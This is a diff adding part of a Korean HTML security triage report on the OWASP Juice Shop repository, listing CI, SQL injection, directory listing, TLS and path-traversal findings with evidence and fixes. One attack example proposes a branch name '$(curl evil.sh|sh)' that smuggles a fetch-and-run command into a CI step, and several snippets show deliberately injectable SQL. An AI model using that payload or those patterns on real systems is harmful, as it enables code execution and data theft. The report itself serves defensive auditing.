+ 359|         run: curl https://cli-assets.heroku.com/install.sh | sh
+ 360|       - name: &quot;Set Heroku app &amp; branch for ${{ github.ref }}&quot;
+ 361|         run: |
+ 362|           if [ &quot;$GITHUB_REF&quot; == &quot;refs/heads/master&quot; ]; then
+ 363|           echo &quot;HEROKU_APP=juice-shop&quot; &gt;&gt; $GITHUB_ENV</code></pre>
+      <p><strong>판정 근거:</strong> Heroku CLI 설치를 curl로 받아 바로 sh에 파이프 — 원격 서버 침해 시 CI 러너에서 RCE.</p>
+      <p><strong>증거:</strong> <code class="evi">run: curl https://cli-assets.heroku.com/install.sh | sh</code></p>
+      <h5>⚔ 공격 예시 (PoC)</h5><pre><code>공급망: cli-assets.heroku.com 이 탈취되면 공격자 install.sh 를 서빙 → CI 러너에서 임의 코드 실행. 클라이언트 페이로드는 없음.</code></pre>
+      
+      <p><strong>수정 방안:</strong> 파일을 먼저 받고 체크섬/서명 검증 후 실행.</p>
+      <div class="note"><strong>트리아지 노트:</strong> 신뢰 벤더 도메인이라 위험은 낮아지나 완전히 제거되진 않음.</div>
+      <p><span class="badge b-mut">CWE-78</span> <span class="badge b-mut">A03:2021</span> <span class="badge b-mut">A03:2025</span></p>
+    </details>
+    <details>
+      <summary>
+        <span class="badge b-info">P3</span>
+        <span class="badge b-err">실제 취약점</span>
+        <code>F015</code> · sql-injection — <code>data/static/codefixes/dbSchemaChallenge_1.ts:5</code> <span class="badge b-mut">도달 불가</span>
+      </summary>
+      <p class="dim">express-sequelize-injection &nbsp;|&nbsp; 악용가능성 <b class="mut">낮음</b> · 신뢰도 0.85 · 엔진 심각도 ERROR</p>
+      <h5>코드 컨텍스트</h5>
+      <pre><code>   1| export function searchProducts () {
+   2|   return (req: Request, res: Response, next: NextFunction) =&gt; {
+   3|     let criteria: any = req.query.q === &#x27;undefined&#x27; ? &#x27;&#x27; : req.query.q ?? &#x27;&#x27;
+   4|     criteria = (criteria.length &lt;= 200) ? criteria : criteria.substring(0, 200)
+   5|     models.sequelize.query(&quot;SELECT * FROM Products WHERE ((name LIKE &#x27;%&quot;+criteria+&quot;%&#x27; OR description LIKE &#x27;%&quot;+criteria+&quot;%&#x27;) AND deletedAt IS NULL) ORDER BY name&quot;)
+   6|       .then(([products]: any) =&gt; {
+   7|         const dataString = JSON.stringify(products)
+   8|         for (let i = 0; i &lt; products.length; i++) {
+   9|           products[i].name = req.__(products[i].name)</code></pre>
+      <p><strong>판정 근거:</strong> 사용자 criteria 를 문자열 접합으로 Sequelize 원시 쿼리에 삽입, 파라미터화 없음 — 실제 SQLi 패턴.</p>
+      <p><strong>증거:</strong> <code class="evi">sequelize.query(&quot;... LIKE &#x27;%&quot;+criteria+&quot;%&#x27; ...&quot;)</code></p>
+      <h5>⚔ 공격 예시 (PoC)</h5><pre><code>F035 와 동일한 SQLi 유형이나, 이 파일은 코드픽스 훈련 스니펫 — 마운트된 라우트가 아니므로 공격할 라이브 엔드포인트가 없음.</code></pre>
+      
+      <p><strong>수정 방안:</strong> 파라미터화 replacements / 바인드 파라미터 사용.</p>
+      <div class="note"><strong>트리아지 노트:</strong> 파일이 data/static/codefixes/ — 챌린지용 코드픽스 스니펫이며 마운트된 라우트가 아님. 실제 대응물은 F035.</div>
+      <p><span class="badge b-mut">CWE-89</span> <span class="badge b-mut">A01:2017</span> <span class="badge b-mut">A03:2021</span> <span class="badge b-mut">A05:2025</span></p>
+    </details>
+    <details>
+      <summary>
+        <span class="badge b-info">P3</span>
+        <span class="badge b-err">실제 취약점</span>
+        <code>F037</code> · info-disclosure — <code>server.ts:268</code>
+      </summary>
+      <p class="dim">express-check-directory-listing &nbsp;|&nbsp; 악용가능성 <b class="warn">중간</b> · 신뢰도 0.85 · 엔진 심각도 WARNING</p>
+      <h5>코드 컨텍스트</h5>
+      <pre><code> 264|     next()
+ 265|   }
+ 266| 
+ 267|   /* /infrastructure directory browsing */
+ 268|   app.use(&#x27;/infrastructure&#x27;, serveIndexMiddleware, serveIndex(&#x27;infrastructure&#x27;, { icons: true, view: &#x27;details&#x27;, filter: (filename) =&gt; filename !== &#x27;README.md&#x27; }))
+ 269|   app.use(&#x27;/infrastructure&#x27;, verify.accessControlChallenges())
+ 270|   app.use(&#x27;/infrastructure&#x27;, (req: Request, res: Response, next: NextFunction) =&gt; {
+ 271|     const filePath = path.resolve(&#x27;infrastructure&#x27;, path.normalize(req.path).replace(/^[\\/]+/, &#x27;&#x27;))
+ 272|     if (!filePath.startsWith(path.resolve(&#x27;infrastructure&#x27;)) || filePath.endsWith(&#x27;README.md&#x27;)) {</code></pre>
+      <p><strong>판정 근거:</strong> serveIndex 로 /infrastructure 디렉터리 브라우징 활성화.</p>
+      <p><strong>증거:</strong> <code class="evi">app.use(&#x27;/infrastructure&#x27;, serveIndexMiddleware, serveIndex(&#x27;infrastructure&#x27;, ...))</code></p>
+      <h5>⚔ 공격 예시 (PoC)</h5><pre><code>GET /infrastructure   → infrastructure 폴더 디렉터리 리스팅.</code></pre>
+      
+      <p><strong>수정 방안:</strong> 디렉터리 리스팅 비활성화; 명시 파일만 서빙.</p>
+      <div class="note"><strong>트리아지 노트:</strong> 뒤에 접근제어 미들웨어 존재 — 부분 완화; 커버리지 확인 필요.</div>
+      <p><span class="badge b-mut">CWE-548</span> <span class="badge b-mut">A06:2017</span> <span class="badge b-mut">A01:2021</span> <span class="badge b-mut">A01:2025</span></p>
+    </details>
+    <details>
+      <summary>
+        <span class="badge b-info">P3</span>
+        <span class="badge b-err">실제 취약점</span>
+        <code>F041</code> · info-disclosure — <code>server.ts:300</code> <span class="badge b-err">✓ 동적 확증됨</span>
+      </summary>
+      <p class="dim">express-check-directory-listing &nbsp;|&nbsp; 악용가능성 <b class="warn">중간</b> · 신뢰도 0.85 · 엔진 심각도 WARNING</p>
+      <h5>코드 컨텍스트</h5>
+      <pre><code> 296|   app.use(&#x27;/encryptionkeys&#x27;, serveIndexMiddleware, serveIndex(&#x27;encryptionkeys&#x27;, { icons: true, view: &#x27;details&#x27; }))
+ 297|   app.use(&#x27;/encryptionkeys/:file&#x27;, serveKeyFiles())
+ 298| 
+ 299|   /* /logs directory browsing */ // vuln-code-snippet neutral-line accessLogDisclosureChallenge
+ 300|   app.use(&#x27;/support/logs&#x27;, serveIndexMiddleware, serveIndex(&#x27;logs&#x27;, { icons: true, view: &#x27;details&#x27; })) // vuln-code-snippet vuln-line accessLogDisclosureChallenge
+ 301|   app.use(&#x27;/support/logs&#x27;, verify.accessControlChallenges()) // vuln-code-snippet hide-line
+ 302|   app.use(&#x27;/support/logs/:file&#x27;, serveLogFiles()) // vuln-code-snippet vuln-line accessLogDisclosureChallenge
+ 303| 
+ 304|   /* Swagger documentation for B2B v2 endpoints */</code></pre>
+      <p><strong>판정 근거:</strong> /support/logs 에 디렉터리 브라우징 → 접근로그 노출.</p>
+      <p><strong>증거:</strong> <code class="evi">serveIndex(&#x27;logs&#x27;, ...)</code></p>
+      <h5>⚔ 공격 예시 (PoC)</h5><pre><code>GET /support/logs   → 접근로그 노출(로그 디렉터리 리스팅).</code></pre>
+      <h5>🎯 동적 검증 → HTTP 200</h5><p><strong>CONFIRMED</strong> — /support/logs/ 디렉터리 리스팅 노출 (5개 항목)</p><pre><code>GET /support/logs/</code></pre>
+      <p><strong>수정 방안:</strong> 리스팅 비활성화; 로그 접근 제한.</p>
+      <div class="note"><strong>트리아지 노트:</strong> 접근로그 노출 챌린지; 뒤에 접근제어 미들웨어.</div>
+      <p><span class="badge b-mut">CWE-548</span> <span class="badge b-mut">A06:2017</span> <span class="badge b-mut">A01:2021</span> <span class="badge b-mut">A01:2025</span></p>
+    </details>
+    <details>
+      <summary>
+        <span class="badge b-info">P3</span>
+        <span class="badge b-err">실제 취약점</span>
+        <code>F023</code> · sql-injection — <code>data/static/codefixes/unionSqlInjectionChallenge_1.ts:6</code> <span class="badge b-mut">도달 불가</span>
+      </summary>
+      <p class="dim">express-sequelize-injection &nbsp;|&nbsp; 악용가능성 <b class="mut">낮음</b> · 신뢰도 0.80 · 엔진 심각도 ERROR</p>
+      <h5>코드 컨텍스트</h5>
+      <pre><code>   2|   return (req: Request, res: Response, next: NextFunction) =&gt; {
+   3|     let criteria: any = req.query.q === &#x27;undefined&#x27; ? &#x27;&#x27; : req.query.q ?? &#x27;&#x27;
+   4|     criteria = (criteria.length &lt;= 200) ? criteria : criteria.substring(0, 200)
+   5|     criteria.replace(/&quot;|&#x27;|;|and|or/i, &quot;&quot;)
+   6|     models.sequelize.query(`SELECT * FROM Products WHERE ((name LIKE &#x27;%${criteria}%&#x27; OR description LIKE &#x27;%${criteria}%&#x27;) AND deletedAt IS NULL) ORDER BY name`)
+   7|       .then(([products]: any) =&gt; {
+   8|         const dataString = JSON.stringify(products)
+   9|         for (let i = 0; i &lt; products.length; i++) {
+  10|           products[i].name = req.__(products[i].name)</code></pre>
+      <p><strong>판정 근거:</strong> 새니타이저가 무효(no-op): criteria.replace(...) 반환값을 버려서 criteria가 그대로 주입 가능.</p>
+      <p><strong>증거:</strong> <code class="evi">criteria.replace(/&quot;|&#x27;|;|and|or/i,&quot;&quot;)  // 반환값 미할당</code></p>
+      <h5>⚔ 공격 예시 (PoC)</h5><pre><code>F035 와 동일한 SQLi 유형이나, 이 파일은 코드픽스 훈련 스니펫 — 마운트된 라우트가 아니므로 공격할 라이브 엔드포인트가 없음.</code></pre>
+      
+      <p><strong>수정 방안:</strong> 파라미터화; 블록리스트 replace 의존 금지.</p>
+      <div class="note"><strong>트리아지 노트:</strong> 깨진 완화 TP. 코드픽스 스니펫(라이브 라우트 아님).</div>
+      <p><span class="badge b-mut">CWE-89</span> <span class="badge b-mut">A01:2017</span> <span class="badge b-mut">A03:2021</span> <span class="badge b-mut">A05:2025</span></p>
+    </details>
+    <details>
+      <summary>
+        <span class="badge b-info">P3</span>
+        <span class="badge b-err">실제 취약점</span>
+        <code>F009</code> · ci-injection — <code>.github/workflows/update-challenges-ebook.yml:22</code>
+      </summary>
+      <p class="dim">run-shell-injection &nbsp;|&nbsp; 악용가능성 <b class="warn">중간</b> · 신뢰도 0.70 · 엔진 심각도 ERROR</p>
+      <h5>코드 컨텍스트</h5>
+      <pre><code>  18|         token: ${{ secrets.BOT_TOKEN }}
+  19|         repository: juice-shop/pwning-juice-shop
+  20|         ref: ${{ github.ref_name }}
+  21|     - name: Update challenges.yml
+  22|       run: |
+  23|         cd docs/modules/ROOT/assets/data
+  24|         rm challenges.yml
+  25|         wget https://raw.githubusercontent.com/juice-shop/juice-shop/${{ github.ref_name }}/data/static/challenges.yml
+  26|     - uses: stefanzweifel/git-auto-commit-action@8621497c8c39c72f3e2a999a26b4ca1b5058a842 #v5.0.1
+  27|       with:
+  28|         commit_message: &quot;Auto-update challenges.yml from ${{ github.sha }}&quot;
+  29|         branch: ${{ github.ref_name }}</code></pre>
+      <p><strong>판정 근거:</strong> github.ref_name 이 run: 안 wget URL에 삽입 — 셸 스텝에 신뢰불가 컨텍스트가 들어감.</p>
+      <p><strong>증거:</strong> <code class="evi">wget https://.../${{ github.ref_name }}/data/static/challenges.yml</code></p>
+      <h5>⚔ 공격 예시 (PoC)</h5><pre><code>브랜치/태그 이름을 예: $(curl evil.sh|sh) 로 만들면 run: wget URL 에 삽입됨. 리포지토리 push/tag 권한 필요.</code></pre>
+      
+      <p><strong>수정 방안:</strong> ref_name 을 env: 변수로 옮기고 따옴표 처리.</p>
+      <div class="note"><strong>트리아지 노트:</strong> ref_name에 대한 공격자 영향은 제한적이나 주입 패턴 자체는 유효.</div>
+      <p><span class="badge b-mut">CWE-78</span> <span class="badge b-mut">A01:2017</span> <span class="badge b-mut">A03:2021</span> <span class="badge b-mut">A05:2025</span></p>
+    </details>
+    <details>
+      <summary>
+        <span class="badge b-info">P3</span>
+        <span class="badge b-warn">검토 필요</span>
+        <code>F018</code> · iac-misconfig — <code>data/static/codefixes/iacLeakedKeyChallenge_1.tf:159</code>
+      </summary>
+      <p class="dim">insecure-load-balancer-tls-version &nbsp;|&nbsp; 악용가능성 <b class="warn">중간</b> · 신뢰도 0.60 · 엔진 심각도 WARNING</p>
+      <h5>코드 컨텍스트</h5>
+      <pre><code> 155| 
+ 156| resource &quot;aws_lb_listener&quot; &quot;http&quot; {
+ 157|   load_balancer_arn = aws_lb.juice_shop.arn
+ 158|   port              = 80
+ 159|   protocol          = &quot;HTTP&quot;
+ 160| 
+ 161|   default_action {
+ 162|     type             = &quot;forward&quot;
+ 163|     target_group_arn = aws_lb_target_group.juice_shop.arn</code></pre>
+      <p><strong>판정 근거:</strong> forward(리다이렉트 아님) 액션의 HTTP:80 ALB 리스너 — 평문 트래픽.</p>
+      <p><strong>증거:</strong> <code class="evi">aws_lb_listener &quot;http&quot; { port=80 protocol=&quot;HTTP&quot; ... type=&quot;forward&quot; }</code></p>
+      <h5>⚔ 공격 예시 (PoC)</h5><pre><code>평문 HTTP:80 리스너 → 유선상 도청/MITM 가능.</code></pre>
+      
+      <p><strong>수정 방안:</strong> 80→443 리다이렉트, 또는 리스너에 TLS1.2+ 종단.</p>
+      <div class="note"><strong>트리아지 노트:</strong> 별도 443 리스너 존재 여부와 80이 리다이렉트 의도인지 확인 필요.</div>
+      <p><span class="badge b-mut">CWE-326</span> <span class="badge b-mut">A03:2017</span> <span class="badge b-mut">A02:2021</span> <span class="badge b-mut">A04:2025</span></p>
+    </details>
+    <details>
+      <summary>
+        <span class="badge b-info">P3</span>
+        <span class="badge b-warn">검토 필요</span>
+        <code>F020</code> · iac-misconfig — <code>data/static/codefixes/iacLeakedKeyChallenge_2.tf:159</code>
+      </summary>
+      <p class="dim">insecure-load-balancer-tls-version &nbsp;|&nbsp; 악용가능성 <b class="warn">중간</b> · 신뢰도 0.60 · 엔진 심각도 WARNING</p>
+      <h5>코드 컨텍스트</h5>
+      <pre><code> 155| 
+ 156| resource &quot;aws_lb_listener&quot; &quot;http&quot; {
+ 157|   load_balancer_arn = aws_lb.juice_shop.arn
+ 158|   port              = 80
+ 159|   protocol          = &quot;HTTP&quot;
+ 160| 
+ 161|   default_action {
+ 162|     type             = &quot;forward&quot;
+ 163|     target_group_arn = aws_lb_target_group.juice_shop.arn</code></pre>
+      <p><strong>판정 근거:</strong> HTTP:80 forward 리스너 (challenge_2 변형).</p>
+      <p><strong>증거:</strong> <code class="evi">port=80 protocol=&quot;HTTP&quot; type=&quot;forward&quot;</code></p>
+      <h5>⚔ 공격 예시 (PoC)</h5><pre><code>평문 HTTP:80 리스너 → 도청/MITM.</code></pre>
+      
+      <p><strong>수정 방안:</strong> 80→443 리다이렉트.</p>
+      <div class="note"><strong>트리아지 노트:</strong> F018과 동일.</div>
+      <p><span class="badge b-mut">CWE-326</span> <span class="badge b-mut">A03:2017</span> <span class="badge b-mut">A02:2021</span> <span class="badge b-mut">A04:2025</span></p>
+    </details>
+    <details>
+      <summary>
+        <span class="badge b-info">P3</span>
+        <span class="badge b-warn">검토 필요</span>
+        <code>F027</code> · iac-misconfig — <code>infrastructure/terraform/networking.tf:160</code>
+      </summary>
+      <p class="dim">insecure-load-balancer-tls-version &nbsp;|&nbsp; 악용가능성 <b class="warn">중간</b> · 신뢰도 0.60 · 엔진 심각도 WARNING</p>
+      <h5>코드 컨텍스트</h5>
+      <pre><code> 156| 
+ 157| resource &quot;aws_lb_listener&quot; &quot;http&quot; {
+ 158|   load_balancer_arn = aws_lb.juice_shop.arn
+ 159|   port              = 80
+ 160|   protocol          = &quot;HTTP&quot;
+ 161| 
+ 162|   default_action {
+ 163|     type             = &quot;forward&quot;
+ 164|     target_group_arn = aws_lb_target_group.juice_shop.arn</code></pre>
+      <p><strong>판정 근거:</strong> infrastructure/terraform 의 HTTP:80 forward 리스너.</p>
+      <p><strong>증거:</strong> <code class="evi">port=80 protocol=&quot;HTTP&quot; type=&quot;forward&quot;</code></p>
+      <h5>⚔ 공격 예시 (PoC)</h5><pre><code>평문 HTTP:80 리스너 → 도청/MITM.</code></pre>
+      
+      <p><strong>수정 방안:</strong> 80→443 리다이렉트.</p>
+      <div class="note"><strong>트리아지 노트:</strong> 리다이렉트 의도 확인 필요.</div>
+      <p><span class="badge b-mut">CWE-326</span> <span class="badge b-mut">A03:2017</span> <span class="badge b-mut">A02:2021</span> <span class="badge b-mut">A04:2025</span></p>
+    </details>
+    <details>
+      <summary>
+        <span class="badge b-info">P3</span>
+        <span class="badge b-warn">검토 필요</span>
+        <code>F030</code> · path-traversal — <code>routes/keyServer.ts:14</code>
+      </summary>
+      <p class="dim">express-res-sendfile &nbsp;|&nbsp; 악용가능성 <b class="mut">낮음</b> · 신뢰도 0.60 · 엔진 심각도 WARNING</p>
+      <h5>코드 컨텍스트</h5>
+      <pre><code>  10|   return ({ params }: Request, res: Response, next: NextFunction) =&gt; {
+  11|     const file = params.file
+  12| 
+  13|     if (!file.includes(&#x27;/&#x27;)) {
+  14|       res.sendFile(path.resolve(&#x27;encryptionkeys/&#x27;, file))
+  15|     } else {
+  16|       res.status(403)
+  17|       next(new Error(&#x27;File names cannot contain forward slashes!&#x27;))
+  18|     }</code></pre>
+      <p><strong>판정 근거:</strong> 사용자 file 의 res.sendFile 이지만 `!file.includes(&#x27;/&#x27;)` 가드로 ../ 디렉터리 이탈 차단.</p>
+      <p><strong>증거:</strong> <code class="evi">if (!file.includes(&#x27;/&#x27;)) { res.sendFile(path.resolve(&#x27;encryptionkeys/&#x27;, file)) }</code></p>
+      <h5>⚔ 공격 예시 (PoC)</h5><pre><code>슬래시 가드가 ../ 이탈 차단; encryptionkeys/ 내부 파일에 한정:
+  GET /encryptionkeys/  후 GET /encryptionkeys/&lt;나열된 파일&gt;   (디렉터리 이탈 불가)</code></pre>
+      
+      <p><strong>수정 방안:</strong> 정규화 + 접두 경로 검증 추가.</p>
+      <div class="note"><strong>트리아지 노트:</strong> 슬래시 가드로 디렉터리 이탈 완화; 잔여 위험은 encryptionkeys/ 내부 파일에 한정. F029보다 낮음.</div>
+      <p><span class="badge b-mut">CWE-73</span> <span class="badge b-mut">A04:2021</span> <span class="badge b-mut">A06:2025</span></p>
+    </details>
+    <details>
+      <summary>
+        <span class="badge b-info">P3</span>
+        <span class="badge b-warn">검토 필요</span>
+        <code>F031</code> · path-traversal — <code>routes/logfileServer.ts:14</code>
+      </summary>
+      <p class="dim">express-res-sendfile &nbsp;|&nbsp; 악용가능성 <b class="mut">낮음</b> · 신뢰도 0.60 · 엔진 심각도 WARNING</p>
+      <h5>코드 컨텍스트</h5>
+      <pre><code>  10|   return ({ params }: Request, res: Response, next: NextFunction) =&gt; {
+  11|     const file = params.file
+  12| 
+  13|     if (!file.includes(&#x27;/&#x27;)) {
+  14|       res.sendFile(path.resolve(&#x27;logs/&#x27;, file))
+  15|     } else {
+  16|       res.status(403)
+  17|       next(new Error(&#x27;File names cannot contain forward slashes!&#x27;))
+  18|     }</code></pre>
+      <p><strong>판정 근거:</strong> logs sendFile 에 동일한 `!file.includes(&#x27;/&#x27;)` 가드.</p>
+      <p><strong>증거:</strong> <code class="evi">if (!file.includes(&#x27;/&#x27;)) { res.sendFile(path.resolve(&#x27;logs/&#x27;, file)) }</code></p>
+      <h5>⚔ 공격 예시 (PoC)</h5><pre><code>슬래시 가드가 이탈 차단; logs/ 디렉터리에만 한정.</code></pre>
+      
+      <p><strong>수정 방안:</strong> 정규화 + 접두 검증.</p>
+      <div class="note"><strong>트리아지 노트:</strong> F030처럼 완화됨.</div>
+      <p><span class="badge b-mut">CWE-73</span> <span class="badge b-mut">A04:2021</span> <span class="badge b-mut">A06:2025</span></p>
+    </details>
+    <details>
+      <summary>
+        <span class="badge b-info">P3</span>
+        <span class="badge b-warn">검토 필요</span>
+        <code>F033</code> · path-traversal — <code>routes/quarantineServer.ts:14</code>
+      </summary>
+      <p class="dim">express-res-sendfile &nbsp;|&nbsp; 악용가능성 <b class="mut">낮음</b> · 신뢰도 0.60 · 엔진 심각도 WARNING</p>
+      <h5>코드 컨텍스트</h5>
+      <pre><code>  10|   return ({ params, query }: Request, res: Response, next: NextFunction) =&gt; {
+  11|     const file = params.file
+  12| 
+  13|     if (!file.includes(&#x27;/&#x27;)) {
+  14|       res.sendFile(path.resolve(&#x27;ftp/quarantine/&#x27;, file))
+  15|     } else {
+  16|       res.status(403)
+  17|       next(new Error(&#x27;File names cannot contain forward slashes!&#x27;))
+  18|     }</code></pre>
+      <p><strong>판정 근거:</strong> quarantine sendFile 에 동일한 `!file.includes(&#x27;/&#x27;)` 가드.</p>
+      <p><strong>증거:</strong> <code class="evi">if (!file.includes(&#x27;/&#x27;)) { res.sendFile(path.resolve(&#x27;ftp/quarantine/&#x27;, file)) }</code></p>
+      <h5>⚔ 공격 예시 (PoC)</h5><pre><code>슬래시 가드가 이탈 차단; ftp/quarantine/ 에만 한정.</code></pre>
+      
+      <p><strong>수정 방안:</strong> 정규화 + 접두 검증.</p>
+      <div class="note"><strong>트리아지 노트:</strong> F030/F031처럼 완화됨.</div>
+      <p><span class="badge b-mut">CWE-73</span> <span class="badge b-mut">A04:2021</span> <span class="badge b-mut">A06:2025</span></p>
+    </details>
+    <details>
+      <summary>
+        <span class="badge b-info">P3</span>
+        <span class="badge b-warn">검토 필요</span>
+        <code>F043</code> · iac-misconfig — <code>terraform/networking.tf:160</code>
+      </summary>
+      <p class="dim">insecure-load-balancer-tls-version &nbsp;|&nbsp; 악용가능성 <b class="warn">중간</b> · 신뢰도 0.60 · 엔진 심각도 WARNING</p>
+      <h5>코드 컨텍스트</h5>
+      <pre><code> 156| 
+ 157| resource &quot;aws_lb_listener&quot; &quot;http&quot; {
+ 158|   load_balancer_arn = aws_lb.juice_shop.arn
+ 159|   port              = 80
+ 160|   protocol          = &quot;HTTP&quot;
+ 161| 
+ 162|   default_action {
+ 163|     type             = &quot;forward&quot;
+ 164|     target_group_arn = aws_lb_target_group.juice_shop.arn</code></pre>
+      <p><strong>판정 근거:</strong> terraform/networking.tf 의 HTTP:80 forward 리스너.</p>
+      <p><strong>증거:</strong> <code class="evi">port=80 protocol=&quot;HTTP&quot; type=&quot;forward&quot;</code></p>
+      <h5>⚔ 공격 예시 (PoC)</h5><pre><code>평문 HTTP:80 리스너 → 도청/MITM.</code></pre>
+      
+      <p><strong>수정 방안:</strong> 80→443 리다이렉트.</p>
+      <div class="note"><strong>트리아지 노트:</strong> 리다이렉트 의도 확인 필요.</div>
+      <p><span class="badge b-mut">CWE-326</span> <span class="badge b-mut">A03:2017</span> <span class="badge b-mut">A02:2021</span> <span class="badge b-mut">A04:2025</span></p>
+    </details></section><section class="section"><h3>P4 — 낮음/정보 <span class="dim">(21건)</span></h3>
+    <details>
+      <summary>
+        <span class="badge b-mut">P4</span>
+        <span class="badge b-err">실제 취약점</span>
+        <code>F001</code> · ci-hardening — <code>.github/workflows/ci.yml:188</code>
+      </summary>
+      <p class="dim">github-actions-mutable-action-tag &nbsp;|&nbsp; 악용가능성 <b class="mut">낮음</b> · 신뢰도 0.90 · 엔진 심각도 WARNING</p>
+      <h5>코드 컨텍스트</h5>
+      <pre><code> 184|         uses: actions/download-artifact@fa0a91b85d4f404e444e00e005971372dc801d16 #v4.1.8
+ 185|         with:
+ 186|           name: api-test-lcov
+ 187|       - name: &quot;Publish coverage to Coveralls&quot;
+ 188|         uses: coverallsapp/github-action@v2
+ 189|         with:
+ 190|           github-token: ${{ secrets.GITHUB_TOKEN }}
+ 191|           files: frontend-lcov.info server-lcov.info api-lcov.info
+ 192|   custom-config-test:</code></pre>
+      <p><strong>판정 근거:</strong> CI 스텝이 변경 가능한 태그(coverallsapp/github-action@v2)를 사용 — 태그가 조용히 다른 커밋으로 바뀔 수 있음.</p>
+      <p><strong>증거:</strong> <code class="evi">uses: coverallsapp/github-action@v2</code></p>
+      <h5>⚔ 공격 예시 (PoC)</h5><pre><code>공급망: 참조된 변경가능 액션 태그를 재지정하면 CI 에서 공격자 코드가 실행됨. 직접적 HTTP 페이로드는 없음.</code></pre>
+      
+      <p><strong>수정 방안:</strong> 40자리 커밋 SHA로 고정.</p>
+      <div class="note"><strong>트리아지 노트:</strong> 실제 공급망 위생 이슈지만 우선순위 낮음. 변경가능 태그 7건 중 1건 — 중복 처리.</div>
+      <p><span class="badge b-mut">CWE-1357</span> <span class="badge b-mut">CWE-353</span> <span class="badge b-mut">A08:2021</span> <span class="badge b-mut">A08:2025</span></p>
+    </details>
+    <details>
+      <summary>
+        <span class="badge b-mut">P4</span>
+        <span class="badge b-err">실제 취약점</span>
+        <code>F003</code> · ci-hardening — <code>.github/workflows/codeql-analysis.yml:23</code>
+      </summary>
+      <p class="dim">github-actions-mutable-action-tag &nbsp;|&nbsp; 악용가능성 <b class="mut">낮음</b> · 신뢰도 0.90 · 엔진 심각도 WARNING</p>
+      <h5>코드 컨텍스트</h5>
+      <pre><code>  19|     steps:
+  20|     - name: Checkout repository
+  21|       uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 #v7.0.1
+  22|     - name: Initialize CodeQL
+  23|       uses: github/codeql-action/init@v3
+  24|       with:
+  25|         languages: ${{ matrix.language }}
+  26|         queries: security-extended
+  27|         config: |</code></pre>
+      <p><strong>판정 근거:</strong> codeql-action/init 이 변경가능 @v3 에 고정.</p>
+      <p><strong>증거:</strong> <code class="evi">uses: github/codeql-action/init@v3</code></p>
+      <h5>⚔ 공격 예시 (PoC)</h5><pre><code>공급망: 참조된 변경가능 액션 태그를 재지정하면 CI 에서 공격자 코드가 실행됨. 직접적 HTTP 페이로드는 없음.</code></pre>
+      
+      <p><strong>수정 방안:</strong> 커밋 SHA로 고정.</p>
+      <div class="note"><strong>트리아지 노트:</strong> 변경가능 태그 군집.</div>
+      <p><span class="badge b-mut">CWE-1357</span> <span class="badge b-mut">CWE-353</span> <span class="badge b-mut">A08:2021</span> <span class="badge b-mut">A08:2025</span></p>
+    </details>
+    <details>
+      <summary>
+        <span class="badge b-mut">P4</span>
+        <span class="badge b-err">실제 취약점</span>
+        <code>F004</code> · ci-hardening — <code>.github/workflows/codeql-analysis.yml:34</code>
+      </summary>
+      <p class="dim">github-actions-mutable-action-tag &nbsp;|&nbsp; 악용가능성 <b class="mut">낮음</b> · 신뢰도 0.90 · 엔진 심각도 WARNING</p>
+      <h5>코드 컨텍스트</h5>
+      <pre><code>  30|           query-filters:
+  31|           - exclude:
+  32|                id: js/missing-rate-limiting
+  33|     - name: Autobuild
+  34|       uses: github/codeql-action/autobuild@v3
+  35|     - name: Perform CodeQL Analysis
+  36|       uses: github/codeql-action/analyze@v3</code></pre>
+      <p><strong>판정 근거:</strong> codeql-action/autobuild 이 변경가능 @v3 에 고정.</p>
+      <p><strong>증거:</strong> <code class="evi">uses: github/codeql-action/autobuild@v3</code></p>
+      <h5>⚔ 공격 예시 (PoC)</h5><pre><code>공급망: 참조된 변경가능 액션 태그를 재지정하면 CI 에서 공격자 코드가 실행됨. 직접적 HTTP 페이로드는 없음.</code></pre>
+      
+      <p><strong>수정 방안:</strong> 커밋 SHA로 고정.</p>
+      <div class="note"><strong>트리아지 노트:</strong> 변경가능 태그 군집.</div>
+      <p><span class="badge b-mut">CWE-1357</span> <span class="badge b-mut">CWE-353</span> <span class="badge b-mut">A08:2021</span> <span class="badge b-mut">A08:2025</span></p>
+    </details>
+    <details>
+      <summary>
+        <span class="badge b-mut">P4</span>
+        <span class="badge b-err">실제 취약점</span>
+        <code>F005</code> · ci-hardening — <code>.github/workflows/codeql-analysis.yml:36</code>
+      </summary>
+      <p class="dim">github-actions-mutable-action-tag &nbsp;|&nbsp; 악용가능성 <b class="mut">낮음</b> · 신뢰도 0.90 · 엔진 심각도 WARNING</p>
+      <h5>코드 컨텍스트</h5>
+      <pre><code>  32|                id: js/missing-rate-limiting
+  33|     - name: Autobuild
+  34|       uses: github/codeql-action/autobuild@v3
+  35|     - name: Perform CodeQL Analysis
+  36|       uses: github/codeql-action/analyze@v3</code></pre>
+      <p><strong>판정 근거:</strong> codeql-action/analyze 가 변경가능 @v3 에 고정.</p>
+      <p><strong>증거:</strong> <code class="evi">uses: github/codeql-action/analyze@v3</code></p>
+      <h5>⚔ 공격 예시 (PoC)</h5><pre><code>공급망: 참조된 변경가능 액션 태그를 재지정하면 CI 에서 공격자 코드가 실행됨. 직접적 HTTP 페이로드는 없음.</code></pre>
+      
+      <p><strong>수정 방안:</strong> 커밋 SHA로 고정.</p>
+      <div class="note"><strong>트리아지 노트:</strong> 변경가능 태그 군집.</div>
+      <p><span class="badge b-mut">CWE-1357</span> <span class="badge b-mut">CWE-353</span> <span class="badge b-mut">A08:2021</span> <span class="badge b-mut">A08:2025</span></p>
+    </details>
+    <details>
+      <summary>
+        <span class="badge b-mut">P4</span>
+        <span class="badge b-err">실제 취약점</span>
+        <code>F006</code> · ci-hardening — <code>.github/workflows/image_actions.yml:30</code>
+      </summary>
+      <p class="dim">github-actions-mutable-action-tag &nbsp;|&nbsp; 악용가능성 <b class="mut">낮음</b> · 신뢰도 0.90 · 엔진 심각도 WARNING</p>
+      <h5>코드 컨텍스트</h5>
+      <pre><code>  26|       (github.event_name != &#x27;pull_request&#x27; ||
+  27|        github.event.pull_request.head.repo.full_name == github.repository)
+  28|     steps:
+  29|       - name: Checkout Branch
+  30|         uses: actions/checkout@v6
+  31|       - name: Compress Images
+  32|         id: calibre
+  33|         uses: calibreapp/image-actions@main
+  34|         with:</code></pre>
+      <p><strong>판정 근거:</strong> actions/checkout 이 변경가능 메이저 @v6 에 고정.</p>
+      <p><strong>증거:</strong> <code class="evi">uses: actions/checkout@v6</code></p>
